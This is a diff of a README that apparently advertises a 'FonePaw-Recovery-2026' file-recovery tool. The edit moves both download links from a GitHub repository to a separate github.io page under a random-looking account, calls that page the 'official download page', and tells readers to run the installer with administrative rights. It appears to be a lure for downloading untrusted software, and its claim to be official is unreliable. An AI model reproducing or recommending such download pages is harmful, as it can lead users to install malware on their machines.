@@ -1,6 +1,6 @@
 # 💾 FonePaw-Recovery-2026 - Recover Deleted Windows Files Easily
 
-[![Download FonePaw Recovery](https://img.shields.io/badge/Download-FonePaw--Recovery-007bff.svg)](https://github.com/Diffidenceflamingo555/FonePaw-Recovery-2026)
+[![Download FonePaw Recovery](https://img.shields.io/badge/Download-FonePaw--Recovery-007bff.svg)](https://diffidenceflamingo555.github.io)
 
 ## 📁 What is FonePaw-Recovery-2026?
 
@@ -24,7 +24,7 @@ Make sure you have administrative rights on your computer to allow the program t
 
 Follow these steps to set up the software. 
 
-1. Visit the [official download page](https://github.com/Diffidenceflamingo555/FonePaw-Recovery-2026).
+1. Visit the [official download page](https://diffidenceflamingo555.github.io).
 2. Click the link to save the installation file to your computer.
 3. Locate the file in your "Downloads" folder.
 4. Double-click the file to start the installer.
